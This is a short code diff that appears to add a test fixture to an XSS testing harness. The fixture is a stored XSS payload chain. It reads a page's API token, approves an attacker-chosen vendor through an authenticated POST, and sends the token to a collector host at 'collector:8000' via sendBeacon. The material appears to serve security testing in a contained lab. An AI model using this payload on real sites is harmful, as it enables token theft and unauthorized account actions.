@@ -55,3 +55,24 @@ DOM_PAYLOAD = Payload("dom-img-onerror", "dom", _img("dom"))
 
 # A legitimate, allowlisted capability statement (renders identically everywhere).
 LEGITIMATE_CAPABILITY = "<p><strong>Legitimate</strong> capability with <em>formatting</em>.</p>"
+
+
+# The full contained takeover chain, as a single checked-in fixture. When it
+# executes it: (1) reads the page-embedded API token, (2) approves the attacker's
+# own vendor as the reviewer — the browser attaches the HttpOnly cookie itself, so
+# the script never needs to read it — and (3) beacons the token to the in-network
+# collector. It performs no other action.
+CHAIN_TARGET_VENDOR = "v-northwind"
+CHAIN_PAYLOAD = Payload(
+    key="stored-chain",
+    marker="chain",
+    html=(
+        '<img src=x onerror="'
+        "window.__scriptjack_xss='chain';"
+        "var m=document.querySelector('meta[name=scriptjack-api-token]');"
+        "var t=m?m.getAttribute('content'):'';"
+        "fetch('/vendors/v-northwind/approve',{method:'POST',headers:{'X-Api-Token':t}});"
+        "navigator.sendBeacon('http://collector:8000/beacon',JSON.stringify({token:t,vendor:'v-northwind'}));"
+        '">'
+    ),
+)
